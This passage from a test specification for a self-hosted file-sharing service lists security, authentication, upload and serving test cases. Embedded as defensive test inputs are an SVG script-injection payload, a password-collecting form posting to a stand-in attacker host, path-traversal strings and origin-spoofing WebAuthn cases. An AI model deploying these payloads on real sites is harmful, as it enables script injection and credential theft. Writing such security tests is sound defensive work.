  `share_link_id` does not match L2. Both tampered forms fail the MAC or the row lookup and are
  rejected in constant time (median delta < 1 ms over 500 samples). No audit event records the
  recipient as a user. Verifies §4.7, §4.9, §6.5.

**T-SEC-08 — SVG scripts are inert, verified in a browser.** *e2e.* Post an SVG containing
`<script>window.__pwned=1</script>`, an `onload=` attribute, a `<foreignObject>` with an
`<iframe src="/api/v1/artifacts">`, and an `<image href="https://example.invalid/x">`. Load it
in a headless Chromium **as a top-level document** and again inside `<img>`. **Expect:**
response carries `Content-Security-Policy: default-src 'none'; style-src 'unsafe-inline'`;
`window.__pwned` is undefined; the console shows CSP violation reports for the script and the
external image; zero outbound network requests leave the browser to any host but `share.test`
(asserted from the browser's own request log). Verifies §6.6.3.

### 14.5.3 Upload integrity and signed URLs

**T-SEC-09 — hash mismatch quarantines and leaves the session retryable.** *Integration.*
Declare a 3-file artifact. `PUT` correct bytes for file 1; for file 2 `PUT` bytes whose digest
differs; for file 3 `PUT` correct bytes but a `Content-Length` one byte short and, separately,
one byte long. **Expect:** file 2 → `400 file_hash_mismatch`, the body written to
`SHARE_QUARANTINE`/ with a name containing the *declared* digest and a timestamp, mode `0640`,
and **no file appears in `SHARE_FILE_ROOT`**; `sh:up:{sid}` still lists file 2 as pending; a
retry with correct bytes succeeds and commit then works. File 3 → `400 file_size_mismatch` with
nothing quarantined for the short case (the stream ended early) and quarantine for the long
case. `SHARE_TMP_ROOT` is empty after each. Quarantined files older than 24 h are removed by the
worker; a fresh one is not. Verifies §3.5, §5.4.

**T-SEC-10 — signed upload URLs cannot be tampered with.** *Integration.* Take a valid
`PUT /api/v1/files/{sha}?sid=&exp=&sig=`. Mutate, one at a time: the `sha256` in the path to
another declared file's hash; the `sha256` to a hash not in the session; `sid` to another
session of the same user; `sid` to another **user's** session; `exp` to a later value keeping
the old `sig`; `sig` by one hex character; `sig` truncated; `sig` removed; `sig` from a
different file in the same session; the whole query re-signed with a guessed key. Also try a
valid signature with the parameters reordered and with `sid` duplicated. **Expect:**
`403 upload_signature_invalid` for all, in constant time (the comparison is `hmac.compare_digest`
— asserted by a median-delta measurement < 0.5 ms over 500 samples between a signature differing
in the first byte and one differing in the last). No bytes are read from the request body before
the signature check — asserted by sending `Content-Length: 5000000` with a slow body and
observing the rejection arrives before 1 MB is consumed. Verifies §5.4 phase 2.

**T-SEC-11 — signed URLs expire and do not survive their session.** *Integration.* (a) Advance
the clock past `exp` and `PUT` → `403 upload_signature_invalid`. (b) Commit the session, then
`PUT` a still-unexpired URL from it → `409 upload_session_closed`. (c) Let the session expire
and the cleanup job run, then `PUT` → `403`/`409`, never `200`. (d) Abort the session, then
`PUT` → `409 upload_session_closed`. Verifies §5.7.

**T-SEC-12 — cross-session and cross-user reuse of a signed URL.** *Integration.* User A and
user B each declare an artifact containing the same file hash. Take A's signed URL and present
it while authenticated as B, and unauthenticated. Take A's URL and change only `sid` to B's
session id. **Expect:** the URL works exactly once, for A's session, regardless of who presents
it (the signature *is* the credential, §5.4) — so the unauthenticated and B-authenticated cases
both succeed **against A's session**, and the test asserts the bytes land under A's session's
pending set and **not** B's, and that B's session remains pending. The `sid`-swapped URL is
`403`. This is the case most likely to be implemented wrong: the signature must bind `sid`, so a
URL cannot be retargeted, but it must not require a bearer token.

### 14.5.4 CSRF, framing, and the dashboard

**T-SEC-13 — CSRF on every unsafe dashboard method.** *e2e.* For each unsafe route reached with
a `share_s` cookie: (a) omit `X-Share-CSRF`; (b) send a mismatched value; (c) send the header
but no `share_csrf` cookie; (d) send both matching (control); (e) submit a cross-origin
`<form method=POST>` from `https://evil.test` with the cookie present; (f) same with
`SameSite` behaviour observed for a top-level `GET` navigation. **Expect:** (a)–(c) are
`403 csrf_failed` with no state change; (d) succeeds; (e) never carries the cookie
(`SameSite=Lax`) and additionally fails the double-submit check; (f) a top-level `GET` to
`/~/artifacts` does carry the cookie, which is why no unsafe action is a `GET` — the test walks
the route table and asserts **no `GET` route mutates state**, by snapshotting row counts around
a call to every `GET`. Verifies §4.4.

**T-SEC-14 — framing rules, including the password-gate exception.** *e2e.* Post artifact `A`
with `allowFraming: true` and `B` without. Create a password link on `A`. **Expect:** `B` is
served `X-Frame-Options: SAMEORIGIN`; `A` at its owner URL omits `X-Frame-Options`; `A` reached
through the **password-protected** link is served `SAMEORIGIN` and the commit/serve response
carries a `framing_ignored_password_link` warning (§6.6.6). A headless browser confirms the
gate page cannot be framed from `https://evil.test`. Verifies §6.6.6.

### 14.5.5 Resolution abuse and cross-space writes

**T-SEC-15 — longest-prefix shadowing cannot read another artifact's files.** *Integration +
e2e.* `user_b` owns `~sarah/q3/report` (bundle with `/img/a.png`). As `user_c`, attempt to
create `~sarah/q3` — impossible, there is no cross-space write (asserted). As `user_b`, create
`q3` containing a file at `/report/img/a.png`. **Expect:** posting `q3` returns a
`shadowing_name` warning (§6.5.1); `/~sarah/q3/report/img/a.png` now resolves to **`q3`'s** file
by longest-prefix — the test asserts the served bytes are `q3`'s, and that this is only
reachable by the owner of both. Then the inverse: `user_b` creates `q3/report/img/a.png` as its
own artifact name; assert `/~sarah/q3/report/img/a.png` resolves to that artifact (longest wins)
and that resolving it does **not** consult `q3/report`'s manifest. Finally, as `user_c` holding a
share link to `~sarah/q3/report`, request `/s/{token}/../q3/x`, `/s/{token}/img/../../a` and
confirm the recipient's path space is confined to the one artifact (`404`). Verifies §6.5.1.

**T-SEC-16 — cross-space write attempts on every write endpoint.** *Integration.* Parameterised
over every `POST`/`PUT`/`PATCH`/`DELETE` route taking an artifact, link, grant, version, or
token identifier. As `user_c` with all scopes, target `user_b`'s objects by name, by ULID, by
`~sarah/name`, and by a name that also exists in `user_c`'s own space (the confusion case).
**Expect:** `404 artifact_not_found` where the identifier is a name (existence must not leak),
`403 not_your_artifact` where the identifier is an opaque ULID the caller could only have from a
legitimate share, `404 link_not_found` / `404 grant_not_found` for those. Where the name also
exists locally, the write lands on **`user_c`'s own** artifact and `user_b`'s is byte-identical
before and after. No request body field named `userId`, `owner`, `handle`, or `space` changes
the target — asserted by injecting each into every write body and diffing outcomes (§5.2).

**T-SEC-17 — the dedupe oracle is closed.** *Integration.* `user_b` posts a file with a
distinctive hash H that `user_c` has never held. `user_c` then declares an artifact containing
H. **Expect:** `skipped == 0`, `uploads` contains H, `totalFiles` is correct. `user_c` uploads
it; the server detects the existing blob and returns `200` **without writing a second copy**
(assert one file on disk, `ref_count` incremented). `user_c` declares H again → now
`skipped == 1`. The test also asserts response timing for the first declare is within 2 ms
median of a declare for a hash nobody holds, over 300 samples — so neither the count nor the
latency answers "does anyone hold these bytes". Verifies §5.4.1, §3.5.

### 14.5.6 Enumeration and timing oracles

**T-SEC-18 — artifact-name enumeration.** *e2e.* Sample 1,000 existing-but-inaccessible names
and 1,000 never-used names in the root space and in `~sarah`. Compare status, body bytes,
`Content-Length`, header set, and latency distribution (median and p95). Repeat for names that
are a prefix of an existing name, names that would shadow one, names differing only in case, and
names of trashed and TTL-expired artifacts. **Expect:** one indistinguishable response for all.
Median latency delta < 2 ms; **a Kolmogorov–Smirnov test on the two latency samples does not
reject the null at p < 0.01** — a stronger check than the median, added because a bimodal
distribution can share a median. Verifies P1, §6.5.2.

**T-SEC-19 — share-token enumeration and entropy.** *`@real_entropy`, integration.* Request
`/s/{t}` for 1,000 well-formed but unused tokens, 1,000 malformed ones (wrong length, base64url
alphabet, ambiguous base58 characters `0OIl`), the token of a revoked link, and the token of an
expired link. **Expect:** unused and malformed → `404 not_found` (never `410` — `410` is only
for a token that *was* real, §7.6); revoked and expired → `410 link_expired` with a body that
names no artifact, no owner, no title, no file type, and no expiry date. Latency medians within
2 ms across all four classes. Separately, generate 10,000 tokens: all 22 base58 characters, no
character outside the alphabet, no duplicates, and a chi-squared uniformity test over positions
passing at p > 0.01. Verifies §7.3.1, §7.6.

**T-SEC-20 — handle and user enumeration.** *Integration.* `POST /api/v1/artifacts/{name}/grants`
with `handle` = an existing user, a non-existent user, a reserved handle (`admin`, `root`,
`www`), the caller's own handle, and a user who already has a grant. Also `GET /~nonexistent/x`
and `GET /~sarah/x`. **Expect:** grant to a real user succeeds; **`404 user_not_found` for a
non-existent handle and `404 user_not_found` for a reserved one** — a reserved handle must not
be distinguishable from a free one; `409 cannot_grant_to_self`; `409 grant_exists`. Latency for
existing vs non-existing handles within 2 ms median over 500 samples, which requires the
argon2-free path to do equal work. `GET /~nonexistent/x` and `GET /~sarah/x` are byte-identical
`404`s, so a space's existence does not leak either.

**T-SEC-21 — password-gate timing and behaviour.** *e2e.* Against `link_pw`, submit the correct
password, a wrong password of the same length, a wrong password of very different length, an
empty password, a 10 KB password, and the correct password for a *different* link. **Expect:**
`303` only for the correct one; `401 recipient_auth_failed` otherwise; the response body is
identical for every failure. Because argon2id runs on the real parameters, timing is dominated
by the KDF: assert the median delta between wrong-password and correct-password (up to the
redirect) is < 15 ms, and that the empty and 10 KB cases still run a full KDF (no early return)
— asserted by their latency being within the same band. Verifies §7.4.

### 14.5.7 WebAuthn abuse

**T-SEC-22 — challenge replay.** *Integration.* Complete a login, capture the assertion, and
replay the identical body. Also: use a challenge from `register/begin` at `login/finish`; use a
challenge after its 300 s Redis TTL; use one challenge for two concurrent finishes. **Expect:**
the first succeeds; every replay is `401 webauthn_verification_failed`; the Redis key
`sh:wa:{id}` is deleted at first use (asserted directly), so replay fails on lookup rather than
on comparison; the concurrent pair yields exactly one success.

**T-SEC-23 — wrong origin and wrong RP ID.** *Integration.* The authenticator signs with
`origin: https://evil.test`, with `origin: http://share.test` (scheme downgrade), with
`origin: https://share.test.evil.test` (suffix confusion), and with an RP ID hash for
`test` (a registrable-suffix attack) and for `other.test`. **Expect:** `401
webauthn_verification_failed` for all five; an `auth.signin_failed` audit row for each; no
session created; the failures count against `webauthn_finish`.

**T-SEC-24 — signature-counter regression.** *Integration.* Register a credential reporting
counter 5. Sign in at 6 (succeeds, stored count becomes 6). Then assert at 6, at 5, and at 0.
Separately, a credential whose stored count is 0 asserts at 0 repeatedly. **Expect:** the three
non-increasing assertions are `401 credential_counter_regressed`; the credential is **not**
revoked (§4.3 step 3); an `auth.counter_regressed` audit row and a `counter_regressed` email
fire for each; the zero-count credential succeeds every time with no email. Verifies §4.3, §10.4.

### 14.5.8 Everything else that is security-shaped

**T-SEC-25 — secrets never reach logs or errors.** *Integration.* Drive one request of each kind
with a real token, a real session cookie, a real share token, a real recovery code, and a real
share-link password, capturing all log output at `DEBUG`. **Expect:** no `shr_` prefix beyond
`display_prefix` (12 chars), no `Bearer ` value, no cookie value, no password, no recovery code
anywhere in the logs. No error `message` or `detail` in any 4xx/5xx contains a filesystem path,
a SHA-256, a token, or the string `/var/lib/share`. Verifies §4.10, §5.1.1.

**T-SEC-26 — the audit log cannot be rewritten.** *Integration.* Connect as the application
database role and attempt `UPDATE audit_event`, `DELETE FROM audit_event`, `TRUNCATE`, and
`ALTER TABLE`. **Expect:** `InsufficientPrivilege` on all four; `INSERT` and `SELECT` succeed.
Verifies §3.8, §10.7.

**T-SEC-27 — a revoked artifact cannot be revalidated into a `304`.** *e2e.* Fetch a file
through a link, capturing `ETag`. Revoke the link. Re-request with `If-None-Match`. **Expect:**
`410`/`404`, never `304` — the authorize call runs before Caddy's conditional handling (§6.6.5).
Repeat with `If-Modified-Since` and with a `Range` request carrying `If-Range`.

**T-SEC-28 — no listing of a space, ever.** *e2e.* `GET /`, `/~`, `/~robert`, `/~robert/`,
`/~sarah/`, `/q3/` (a name prefix with children), and `/api/v1/artifacts` unauthenticated.
**Expect:** `404` for the artifact-space forms (the root `/` may serve the sign-in redirect —
asserted to contain no artifact names), `401` for the API. `/q3/` renders `q3`'s own listing
only if `q3` is an artifact the caller may see, and never a list of names starting with `q3`.
Verifies §6.6.2.

**T-SEC-29 — `robots.txt` has no override.** *e2e + static.* `GET /robots.txt` unauthenticated,
authenticated, and through a share link. **Expect:** byte-exactly
`User-agent: *\nDisallow: /\n` in all three. Grep the settings schema and the artifact schema
for `indexable|robots|noindex` and assert no per-artifact control exists. Every artifact
response carries `X-Robots-Tag: noindex, nofollow`. Verifies §6.7.

**T-SEC-30 — the phishing heuristic warns and never blocks.** *Integration.* Post an HTML file
containing `<form action="https://evil.test/collect"><input type="password">`. **Expect:**
`201`/`200` — the post **succeeds** — with a `possible_credential_form` warning in `warnings`,
and the warning is visible to the owner only (absent from any recipient-facing response).
Posting the same form with a same-origin action produces no warning. Verifies §10.5.

## 14.6 T-AUTH — identity, passkeys, sessions, tokens

**T-AUTH-01 — passkey registration round trip.** *Integration.* Software authenticator, real
ceremony. `register/begin` as a signed-in user → assert `rp.id == SHARE_HOST`,
`attestation == "none"`, `residentKey == "preferred"`, `userVerification == "preferred"`,
`timeout == 120000`, and `excludeCredentials` listing the user's existing credential IDs.
Finish → `201`, a `passkey_credential` row with the COSE key, `sign_count`, `transports`,
`aaguid`, `backup_eligible`, `backup_state`, and a `name` defaulted from the AAGUID list. A
`passkey.register` audit row. Verifies §4.2.

**T-AUTH-02 — duplicate authenticator is excluded.** *Integration.* Register, then attempt to
register the same credential ID again. **Expect:** the browser-side exclusion is asserted by
checking the ID appears in `excludeCredentials`; a client that ignores it and finishes anyway is
rejected with `409` and no second row (the `credential_id` unique constraint is real). §4.2.

**T-AUTH-03 — usernameless sign-in.** *Integration.* `login/begin` with an empty body →
`allowCredentials == []`. The authenticator picks the discoverable credential; `login/finish`
→ `200` with `{user:{id,email,handle,displayName,isRoot}}`, `Set-Cookie: share_s=…;
HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=2592000` and no `Domain` attribute (host-only).
A `session` row with `passkey_id` set. `auth.signin` audited. §4.3.

**T-AUTH-04 — unknown credential.** *Integration.* Finish with a credential ID never registered
→ `401 invalid_credential`, no session, audited, counted against `webauthn_finish`. §4.3.

**T-AUTH-05 — session lifetime and sliding extension.** *Integration.* With the injected clock:
a request 59 minutes after issue does **not** move `expires_at`; a request at 61 minutes does,
to now + 30 d; at day 89 the session still works; at day 91 it is `401 session_expired`
regardless of sliding — the 90-day absolute cap holds. §4.4.

**T-AUTH-06 — session listing and revocation.** *Integration.* Create three sessions.
`GET /api/v1/auth/sessions` returns created, last seen, IP, coarse UA, passkey name, and exactly
one `current: true`. `DELETE` a non-current one → that cookie is `401` on its next request and
its `sh:sess:` Redis key is deleted immediately. Revoking the passkey that signed sessions 1 and
3 revokes both and leaves 2. Disabling the user revokes all. §4.4.

**T-AUTH-07 — token resolution is uniform and constant-time.** *Integration.* Present, in turn:
a valid token, an unknown well-formed token, `tok_revoked`, `tok_expired`,
`tok_disabled_owner`, a token with a mangled prefix, an empty Bearer, and a token with a valid
hash but wrong prefix. **Expect:** `401 invalid_token` with an identical body for all failure
cases — "revoked" is never distinguishable from "wrong". Median latency delta across the failure
classes < 1 ms over 500 samples. `last_used_at` is not written on the request path (assert no
`UPDATE api_token` in the statement log); it appears after the 60 s Redis flush. §4.6.

**T-AUTH-08 — token revocation bypasses the cache.** *Integration.* Authenticate to warm
`sh:tok:{sha}`. Revoke. Immediately call again with the clock frozen. **Expect:** `401
invalid_token`; the Redis key is absent (explicit `DEL`, not TTL). §4.6.

**T-AUTH-09 — scope enforcement across the whole powerset.** *Integration.* Parameterised over
every (endpoint, token) pair from the §14.2.8 powerset. **Expect:** the call succeeds iff the
token holds the scope §4.6.1 assigns to that endpoint; otherwise `403 insufficient_scope` with
`detail.scope` naming the **missing** scope literally (`share:create`, not "sharing"). A
matrix-completeness assertion fails if any endpoint maps to no scope. §4.6.1.

**T-AUTH-10 — the agent default cannot share.** *Integration.* With `tok_agent`: `POST
/artifacts/{n}/links`, `PATCH /links/{id}`, `DELETE /links/{id}`, `POST /artifacts/{n}/grants`,
and `POST /artifacts/bundle?link=true` if such a parameter exists. **Expect:** `403
insufficient_scope`, `detail.scope == "share:create"`, message naming it; zero `share_link` rows
created; a `link.create` audit row is **not** written. §7.9.

**T-AUTH-11 — the agent default cannot permanently delete.** *Integration.* With `tok_agent`:
`DELETE /api/v1/artifacts/{n}?purge=true` → `403 insufficient_scope`, `detail.scope ==
"artifacts:delete"`. Then trash 50 artifacts (allowed) and assert every one is restorable and
every byte still on disk. **The worst case for a runaway agent is a full trash.** §8.4, §4.6.1.

**T-AUTH-12 — device-code flow.** *Integration.* `device/start` → `deviceCode`, a `userCode`
matching `^[A-Z0-9]{4}-[A-Z0-9]{4}$` with no ambiguous characters, `verifyUrl`, `expiresIn:600`,
`interval:5`. Poll before approval → `428 authorization_pending`. Poll faster than `interval` →
`429 rate_limited`, `detail.bucket == "device_poll"`. Approve in an authenticated session; poll
→ `200` with a token holding exactly `["artifacts:read","artifacts:write"]`. Poll again → the
code is single-use, `428`/`404`, never a second token. Let a code expire → `410`. A
`token.device_authorize` audit row and a `token_created` email. §4.6.2.

**T-AUTH-13 — recovery code.** *Integration.* Use a valid code → `200`, a session whose
`expires_at` is now + 30 min. Assert that session can call exactly two things — register a
passkey and list passkeys — and is `403` on `/api/v1/artifacts` and everything else. Using the
code invalidates all other codes and issues one fresh code. Reusing it → `401`. A
`auth.recovery_used` audit row and a `recovery_used` email that **cannot** be disabled (set
`settings.notifications.recovery_used=false` and assert the mail still fires). §4.5, §10.8.

**T-AUTH-14 — recovery rate limits.** *Integration.* 6 attempts for one email in an hour → the
6th is `429`, `detail.bucket == "recovery_use"`. 21 attempts from one IP across different emails
in a day → `429`, bucket `recovery_use_ip`. §10.2.2.

**T-AUTH-15 — `sharectl grant-session`.** *Integration.* Run it for an email; it prints a URL;
first use establishes a 30-minute session; second use fails. Audited as `auth.session_granted`
with `actor_type='system'`. Running it as a non-root OS user fails before touching the database.
§4.5.

**T-AUTH-16 — no password exists anywhere.** *Static + integration.* Grep the schema for a
column matching `password` and assert exactly two exist: `share_link.password_hash` and
`recovery_code.code_hash` (named differently, asserted by name). Grep the API surface for any
route matching `password.*reset|forgot|change` and assert none exists outside
`PATCH /api/v1/links/{id}`. §4.1.

**T-AUTH-17 — invites.** *Integration.* Root invites `sarah@…` with handle `sarah` → an `invite`
row, an `invite` email, `user.invite` audited. A second pending invite for the same email →
`409`. An invite for a reserved handle (`admin`, `www`, `root`, `system`, `support`, `help`,
`about`, `status`, `null`, `undefined`, `s`, `api`, `mcp`, `auth`, `internal`) →
`422 name_reserved`. Accepting registers a passkey and creates the user with an empty space;
`user.create` audited. Accepting an expired invite → `410 invite_expired`. A non-admin user
inviting → `403 insufficient_scope` naming `account:admin`. §4.8, §6.3.

**T-AUTH-18 — bootstrap.** *Integration.* On an empty database, `sharectl bootstrap` creates
exactly one user with `is_root=true`, prints a 15-minute registration URL, and prints one
recovery code and one API token. Running it again with any user present → non-zero exit,
nothing changed. Attempting to insert a second `is_root=true` row raises on `one_root_user`.
§3.11, §3.3.

**T-AUTH-19 — negative trio for `/auth/*`.** *Integration.* Per §14.1.3 for every auth route:
permission (a recipient session at `/auth/passkey/register/begin` → `403
wrong_credential_class`), limit (21 `login/begin` from one IP in 10 min → `429`, bucket
`webauthn_begin`; 11 `login/finish` → bucket `webauthn_finish`), malformed (non-CBOR credential,
missing `credential`, oversized attestation → `422` with `detail.fields`). §10.2.2.

## 14.7 T-POST — declare, upload, commit

**T-POST-01 — the happy three-phase path.** *Integration.* Declare 3 files → `201` with
`artifactId`, `versionId`, `seq:1`, `uploadSessionId`, `expiresAt` ≈ now + 4 h, `totalFiles:3`,
`skipped:0`, three `uploads` entries. `PUT` each → `{sha256,size,remaining}` with `remaining`
counting down 2,1,0. Commit → `200` matching §5.4's body: `url`, `seq:1`, `kind:"bundle"`,
`entryPath:"/index.html"`, `fileCount:3`, `totalBytes`, `visibility:"private"`, `shareLinks:0`.
Assert `visibility` is `private` and zero `share_link` rows — **posting never publishes**. An
`artifact.post` audit row with `actor_token_id`. §5.4.

**T-POST-02 — dedupe within one manifest.** *Integration.* Declare 5 files where three paths
carry the same hash. **Expect:** `uploads` has 3 entries, not 5; one `PUT` satisfies all three
paths; commit writes 5 `version_file` rows referencing 3 files; `file.ref_count` for the shared
hash increases by **3** (per reference, not per file). §5.4.

**T-POST-03 — dedupe across versions and users.** *Integration.* Post v1; repost with one file
changed. **Expect:** second declare has `skipped:2`, `uploads` length 1. `ref_count` for the
unchanged files is 2. Then `user_b` posts the same unchanged file → `skipped:0` for them
(§5.4.1), upload returns `200` without a second blob, `ref_count` becomes 3, one file on disk.
§3.5, §5.4.1.

**T-POST-04 — resume after a crash.** *Integration.* Declare 5 files, upload 2, kill the client.
`GET /api/v1/uploads/{sid}` → the session with **freshly signed** URLs for the 3 pending only,
new `exp` values, and the 2 done files absent. Upload the rest and commit → success, `seq:1`.
Assert the resumed URLs are valid and the original URLs for the 2 completed files now return
`200` immediately without reading a body. §5.4 phase 2.

**T-POST-05 — commit before uploads finish.** *Integration.* Commit with 1 of 3 uploaded →
`409 files_missing` with `detail` listing the missing paths; **nothing mutated** —
`artifact.live_version_id` unchanged, no `version_file` rows, `ref_count` unchanged, session
still `open`. Complete and commit → success. §5.4 phase 3.

**T-POST-06 — concurrent commit of one session.** *Integration `@commit_required`.* Fire two
commits for the same `versionId` simultaneously from two connections. **Expect:** exactly one
`200`; the other `409 upload_session_closed`. Exactly one `artifact_version` at that `seq`, one
set of `version_file` rows, `ref_count` incremented exactly once, one `artifact.post` audit row.
Run 20 times to catch the race. §5.4.

**T-POST-07 — concurrent commit of two sessions on one name.** *Integration
`@commit_required`.* Declare twice against `postcal` (seq 2 and seq 3 drafts), then commit both
concurrently. **Expect:** both may succeed — `UNIQUE (artifact_id, seq)` forces distinct
sequences, and the test asserts the final `live_version_id` is one of the two, that no seq is
duplicated or skipped, and that `version_file` rows exist for both. If the implementation
serialises instead, the second must be `409` with a stable code, and the test accepts either
behaviour but requires it be **deterministic across 20 runs**. See §14.24 ambiguity A6.

**T-POST-08 — quota at declare.** *Integration.* Set the user near quota; declare a version that
would exceed it. **Expect:** `413 quota_exceeded` at **declare** — before any byte moves —
with `detail.currentBytes`, `projectedBytes`, `quotaBytes`; no `upload_session` row; no signed
URLs issued. §10.3.

**T-POST-09 — quota at commit.** *Integration.* Declare within quota. Then, before commit, fill
the quota with a second artifact. Commit → `413 quota_exceeded`, nothing mutated, the session
left in a state where a later commit after freeing space succeeds. Asserts quota is checked at
**both** points (§10.3), which the declare-only test cannot show.

**T-POST-10 — over-quota still allows reading, sharing, and deleting.** *Integration.* At 100%:
`POST /artifacts` → `413`; `GET /artifacts`, `GET files/content`, `POST links` (with
`tok_sharer`), `DELETE /artifacts/{n}` all succeed. §10.3.

**T-POST-11 — 5,000-file manifest.** *Integration.* Declare exactly 5,000 files (small),
upload with concurrency 8, commit. **Expect:** success; `file_count == 5000`; the declare
response is a single JSON body under the 10 MB request ceiling (assert the *request* is under
it — 5,000 entries at ~120 bytes is ~600 KB); commit completes in one transaction using `COPY`
(asserted by statement count, not a per-row `INSERT` loop: fewer than 50 statements total).
Declare 5,001 → `413 too_many_files`. §5.4, §10.3, §14.20.

**T-POST-12 — file and artifact ceilings.** *Integration.* A file one byte over
`SHARE_MAX_FILE_BYTES` → `413 file_too_large` **at declare** (the declared size is checked) and
again at upload if a client lies about the size (the stream is cut and the partial discarded). A
version whose summed size exceeds `SHARE_MAX_ARTIFACT_BYTES` → `413 artifact_too_large` at
commit. §10.3, §3.5.

**T-POST-13 — `kind` derivation.** *Integration.* Parameterised: 4 files → `bundle`; 1 `.html` →
`page`; 1 `.pdf` → `document`; 1 `.docx` → `document`; 1 `.png` → `image`; 1 `.mp4` → `video`;
1 `.bin` → `file`; 1 `.svg` → `image`; 1 `.txt` → `file`; 2 files where one is HTML → `bundle`.
**Expect:** the mapping above exactly, derived at commit from the manifest shape with **no file
opened** (read counter is zero during commit). §3.4.

**T-POST-14 — entry-path resolution precedence.** *Unit + integration.* The five rules of §5.5 in
order: (1) explicit `entryPath` present in the manifest wins even when `/index.html` also
exists; (2) explicit `entryPath` **absent** from the manifest → falls through to the next rule
and returns an `entry_path_not_found` warning (see §14.24 ambiguity A3); (3) `/index.html`
wins over a lone other HTML file; (4) exactly one HTML file among several non-HTML files wins;
(5) two HTML files and no `/index.html` → no entry, `no_entry_point` warning, root renders the
listing; (6) exactly one file of any type → that file; (7) zero files → rejected at declare.
Each case asserts both the commit response's `entryPath` and what `GET /{name}` actually serves.
§5.5, §6.6.1.

**T-POST-15 — name validation.** *Unit + integration.* Accept: `a`, `postcal`, `q3/market-report`,
`a.b-c_d`, `x/y/z/1/2/3/4/8` (8 segments), a 200-char name. Reject: `PostCal` → accepted **as
`postcal`** (lowercased before validation, §5.3); `-lead`, `.lead`, `_lead`, `a//b`, `a/`, `/a`,
`a/../b`, `a/..`, `a/.`, 9 segments, 201 chars, `a b`, `a?b`, `a#b`, an emoji, a name that is
only dots. Reserved: `s`, `api`, `mcp`, `auth`, `internal`, `.well-known`, `robots.txt`,
`favicon.ico`, and any name starting with `~` → `422 name_reserved`. §5.3, §6.3.

**T-POST-16 — generated names.** *Integration.* Post 500 artifacts with no `name`. **Expect:**
every name matches `^[a-z]+-[a-z]+-[a-z0-9]{4}$`, passes §5.3 validation, is not reserved, and
is unique within the space; a collision path exists (force the generator to repeat and assert
the server retries rather than returning `409`). §5.3.

**T-POST-17 — overwrite by name creates a version.** *Integration.* Post `postcal` twice.
**Expect:** one `artifact` row, two `artifact_version` rows (seq 1, 2), `live_version_id`
pointing at seq 2, the URL unchanged, `artifact.overwrite` audited (not a second
`artifact.post`), and version 1 still fully served through the version preview route. §8.2,
§10.7.

**T-POST-18 — the pointer flip is the only visible change.** *Integration `@commit_required`.*
Start a reader loop hitting `/postcal/index.html` from another connection while a second version
commits. **Expect:** every response is `200` with either v1's or v2's bytes complete and valid —
never a mix, never a `404`, never a partial. The transition happens exactly once in the sequence
(no flapping). §5.4.

**T-POST-19 — one-shot bundle upload.** *Integration.* `POST /api/v1/artifacts/bundle` with a
tar and with a gzip. **Expect:** the same body shape as commit; `kind`, `entryPath`, and
`fileCount` correct; a `.tar.gz` and a plain `.tar` both accepted; query parameters `name`,
`title`, `entryPath` honoured; an archive with a name colliding with an existing artifact
creates a new **version** of it. Ceilings: 201 MB compressed → `413`; 801 MB expanded → `413
artifact_too_large`; 5,001 entries → `413 too_many_files`. §5.6.

**T-POST-20 — idempotency.** *Integration.* Declare with `Idempotency-Key: K` twice with the
identical body → the second returns the original `201` body byte-identically plus
`X-Share-Idempotent-Replay: true`, and **no second `upload_session` row**. Same key, different
body → `409 idempotency_key_reused`. Same key, different user → independent (the key is scoped
to `(user, endpoint, key)`). Same key, different endpoint → independent. After 24 h the key is
forgotten and the call creates a new session. A 256-char key → `422`. §5.1.3.

**T-POST-21 — abandoned sessions.** *Integration.* Declare, upload one file, advance 4 h + 1 min,
run the cleanup job. **Expect:** `upload_session.state == 'expired'`, the draft
`artifact_version` row deleted, **no `version_file` rows ever existed so no `ref_count` moved**,
the uploaded file now unreferenced and collectable after its 24 h grace. Committing the expired
session → `409 upload_session_expired`. Re-declaring the same manifest → `skipped` equals the
number already uploaded and `uploads` is correspondingly short. §5.7.

**T-POST-22 — copy.** *Integration.* `user_b` grants `deck` to `user_c`; `user_c` copies it.
**Expect:** a new artifact in `user_c`'s space, first version referencing the **same** `file`
rows (zero new blobs, `ref_count` incremented), `copied_from` set, `visibility: private`, zero
links and grants regardless of the source's state, `artifact.copy` audited on **both** sides,
and the event visible in `user_b`'s artifact activity. Copying something not shared with you →
`404`. §5.10, §7.7.1.

**T-POST-23 — `PATCH` metadata.** *Integration.* Any subset of `name`, `title`, `description`,
`entryPath`, `tags`, `ttl`, `pinned`. Absent fields unchanged; `null` clears nullable ones.
Renaming moves the address: the new name `200`s and the old `404`s **immediately** with no
alias, no redirect. Changing `entryPath` to a path in the manifest takes effect without a repost;
to a path not in the manifest → `422`. `PATCH` containing `visibility` or `shareLinks` →
`422 use_share_endpoint` even when the value matches the current state. 21 tags → `422`. §5.9.

**T-POST-24 — negative trio for the post surface.** *Integration.* Permission: `tok_ro` declaring
→ `403 insufficient_scope` naming `artifacts:write`. Limit: 241 declares in an hour → `429`,
`detail.bucket == "post"`; 121 from one token → bucket `post_token`; 17 concurrent `PUT`s on one
session → `429 too_many_uploads` with `Retry-After`. Malformed: `files: []` → `422`; a
`sha256` of 63 chars, uppercase hex, or non-hex → `422 invalid_hash`; `size` as a string;
`ttl: "banana"` → `422 invalid_ttl`; an unknown top-level field. §14.1.3.

## 14.8 T-SERVE — resolution and serving

**T-SERVE-01 — owner serves their own bundle.** *e2e.* `GET /postcal/style.css` with a session.
**Expect:** `200`, `Content-Type: text/css; charset=utf-8`, `Cache-Control: private, max-age=300`,
`ETag` equal to the file's SHA-256, `Last-Modified` equal to the version's `created_at`,
`X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`,
`X-Robots-Tag: noindex, nofollow`, `Permissions-Policy: interest-cohort=()`, no `Server` header,
no header naming the artifact, version, or owner. §2.4, §6.6.5, §6.6.6.

**T-SERVE-02 — both root forms resolve.** *e2e.* For the root user, `/postcal` and
`/~robert/postcal` both serve the same bytes; for `user_b`, `/deck` is `404` and
`/~sarah/deck` serves. §6.2.

**T-SERVE-03 — the file-resolution ladder.** *e2e.* Parameterised over the seven rules of §6.6.1:
empty path → entry; exact match; trailing slash → `+index.html`; `P + "/index.html"` exists →
`308` to `P + "/"` **preserving the query string**; `P + ".html"` exists → served; a missing path
in an artifact carrying `/404.html` → that file with status **404**; otherwise the standard
404 page. Assert the `308` (not `301`/`302`) and that the `Location` is relative-safe.

**T-SERVE-04 — no SPA fallback.** *e2e.* Request `/app/missing.json` in an artifact with
`/index.html`. **Expect:** `404` with the not-found page, **not** `index.html`, and the
